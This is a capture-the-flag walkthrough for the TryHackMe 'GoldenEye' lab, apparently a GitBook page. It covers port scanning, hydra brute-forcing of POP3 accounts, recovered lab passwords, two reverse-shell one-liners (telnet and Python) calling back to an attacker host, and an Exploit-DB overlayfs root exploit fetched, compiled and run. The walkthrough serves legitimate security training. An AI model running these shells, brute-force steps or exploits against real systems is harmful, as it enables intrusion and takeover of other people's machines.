# GoldenEye

**Room Link:** [https://tryhackme.com/room/goldeneye](https://tryhackme.com/room/goldeneye)



## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (3).png" alt=""><figcaption></figcaption></figure>



## TCP/80 - HTTP

**Kali**

```
gobuster dir -u $VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```



<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We find a encoded password and also a potential other user, Natalya.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I can login to /sev-home now



```
Username: boris
Password: InvincibleHack3r
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## TCP/55007 - POP3

**Kali**

```
telnet $VICTIM 55007
USER boris
PASS InvincibleHack3r
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3://$VICTIM:55007
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://$VICTIM:55007
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
telnet $VICTIM 55007
USER natalya
PASS bird
RETR 1
RETR 2
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

New password still doesn't work but maybe can be used elsewhere.

**Kali**

```
telnet $VICTIM 55007
USER boris
PASS secret1!
RETR 1
RETR 2
RETR 3
```

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Added severnaya-station.com to my hosts file and then navigated to http://severnaya-station.com/gnocertdir as mentioned in the email

```
username: xenia
password: RCP90rulez!
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (18) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://$VICTIM:55007
```

**Kali**

```
telnet $VICTIM 55007
USER doak
PASS goat
RETR 1
```

<figure><img src="../../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (610).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (611).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (612).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
exiftool for-007.jpg 
echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d 
```

<figure><img src="../../.gitbook/assets/image (613).png" alt=""><figcaption></figcaption></figure>

It was the password for admin

```
Username: admin
Password: xWinter1995x!
```



## **Initial Shell**

**Kali**

```
nc -lvnp 4444
```

**Browser**

```
sh -c '(sleep 4062|telnet $KALI 4444|while : ; do sh && break; done 2>&1|telnet $KALI 4444 >/dev/null 2>&1 &)'
```

<figure><img src="../../.gitbook/assets/image (616).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (617).png" alt=""><figcaption></figcaption></figure>

It kind of worked but the shell kept breaking so I switched it to a python one and did the same thing.

**Kali**

<pre><code><strong>nc -lvnp 4444
</strong></code></pre>

**Browser**

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$KALI",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

<figure><img src="../../.gitbook/assets/image (618).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (619).png" alt=""><figcaption></figcaption></figure>



Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```





### Privlege Escalation

Just changed below line from gcc to cc as gcc is not installed on the host

**Kali**

```
wget https://www.exploit-db.com/raw/37292 -O ofs.c 
python2 -m SimpleHTTPServer 81
```

<figure><img src="../../.gitbook/assets/image (620).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cd /tmp/
wget http://$KALI:81/ofs.c 
id
cc ofs.c -o ofs
./ofs
id
whoami
```

<figure><img src="../../.gitbook/assets/image (621).png" alt=""><figcaption></figcaption></figure>

